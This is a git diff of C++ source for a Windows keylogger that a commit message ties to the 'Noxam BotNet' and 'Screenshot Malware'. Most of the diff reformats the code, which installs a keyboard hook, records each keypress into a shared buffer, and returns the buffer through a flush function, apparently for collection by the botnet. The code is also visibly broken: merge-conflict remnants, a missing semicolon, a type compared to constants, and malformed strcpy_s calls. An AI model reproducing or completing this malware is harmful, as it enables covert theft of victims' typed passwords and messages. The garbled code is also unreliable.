@@ -6,8 +6,6 @@
 
 using namespace std;
 
-
-
 /*
 |===========================================================
 |    NoxamFLushKeyLoggBuffer()
@@ -16,7 +14,7 @@ using namespace std;
 |
 |===========================================================
 */
-char* NoxamFLushKeyLoggBuffer(int* NxmLength)
+char *NoxamFLushKeyLoggBuffer(int *NxmLength)
 {
     *NxmLength = 0;
 
@@ -24,8 +22,7 @@ char* NoxamFLushKeyLoggBuffer(int* NxmLength)
     {
         return NULL;
     }
-    std::lock_guard<std::mutex> guard(m)
-    char* NewBuffer = (char*)malloc(I + 1);
+    std::lock_guard<std::mutex> guard(m) char *NewBuffer = (char *)malloc(I + 1);
     NewBuffer[I] = 0;
     memcpy_s(NewBuffer, I, NxmKeyLogBuffer, I);
     *NxmLength = I;
@@ -67,12 +64,10 @@ char NoxamEasyToLower(char NxmIn)
 */
 bool NoxamStartLogger()
 {
-<<<<<<< HEAD
 
-=======
     if (NxmKeyLogBuffer == 0)
     {
-        NxmKeyLogBuffer = (char*)malloc(NOXAM_KEYLOG_BUFFER_SIZE);
+        NxmKeyLogBuffer = (char *)malloc(NOXAM_KEYLOG_BUFFER_SIZE);
     }
 
     if (NxmIsLogging)
@@ -89,7 +84,6 @@ bool NoxamStartLogger()
     NxmIsLogging = true;
 
     return NxmIsLogging;
->>>>>>> 3931c6e (Completed Screenshot Malware For Noxam BotNet)
 }
 
 /*
@@ -102,9 +96,6 @@ bool NoxamStartLogger()
 */
 bool NoxamStopLogger()
 {
-<<<<<<< HEAD
-
-=======
     if (!NxmIsLogging)
     {
         return true;
@@ -112,7 +103,6 @@ bool NoxamStopLogger()
     NxmIsLogging = !UnhookWindowsHookEx(NxmKeyHook);
 
     return NxmIsLogging;
->>>>>>> 3931c6e (Completed Screenshot Malware For Noxam BotNet)
 }
 
 /*
@@ -138,7 +128,9 @@ bool NoxamIsKeyLogging()
 */
 __declspec(NxmDllExport) LRESULT NxmCallBack NxmKeyEvent(int NxmCode, WPARAM NxmWParam, LPARAM NxmLParam)
 {
-    char SzKey[256]; DWORD DwMsg; int I;
+    char SzKey[256];
+    DWORD DwMsg;
+    int I;
 
     if ((NxmCode == HC_ACTION) && ((WPARAM == WM_SYSKEYDOWN) || (WPARAM == WM_KEYDOWN)))
     {
@@ -185,17 +177,21 @@ __declspec(NxmDllExport) LRESULT NxmCallBack NxmKeyEvent(int NxmCode, WPARAM Nxm
 
         if (I > 1 && strcmp(SzKey, "backspace") != 0)
         {
-            strcpy_s(SzKey, + strlen(SzKey), 245, - strlen(SzKey), "\n");
-        } else if (I > 1 && strcmp(SzKey, "backspace") == 0) {
+            strcpy_s(SzKey, +strlen(SzKey), 245, -strlen(SzKey), "\n");
+        }
+        else if (I > 1 && strcmp(SzKey, "backspace") == 0)
+        {
             I -= 1;
         }
-        char* NewBuffer = SzKey;
+        char *NewBuffer = SzKey;
 
         if (UsePrefix && I > 1)
         {
-            NewBuffer = (char*)malloc(500);
+            NewBuffer = (char *)malloc(500);
             sprintf_s(NewBuffer, 500, "%s+%s", "shift", SzKey);
-        } else if (I == 1) {
+        }
+        else if (I == 1)
+        {
             NxmShiftModifier = false;
         }
 
@@ -229,7 +225,6 @@ DWORD WINAPI NoxamStartLoggerInvoker(LPVOID NxmIPParameter)
     return 0;
 }
 
-
 /*
 |===========================================================
 |    NoxamMsgLoop()
@@ -262,7 +257,7 @@ void NoxamMsgLoop()
 |
 |===========================================================
 */
-void NoxamWriteLog(char* NxmKey, int NxmLength)
+void NoxamWriteLog(char *NxmKey, int NxmLength)
 {
     std::lock_guard<std::mutex> guard(m);
 
@@ -286,7 +281,7 @@ void NoxamWriteLog(char* NxmKey, int NxmLength)
 |
 |===========================================================
 */
-void NoxamFreeFlushKeyLogBufferResult(char* NxmData)
+void NoxamFreeFlushKeyLogBufferResult(char *NxmData)
 {
     if (NxmData)
     {
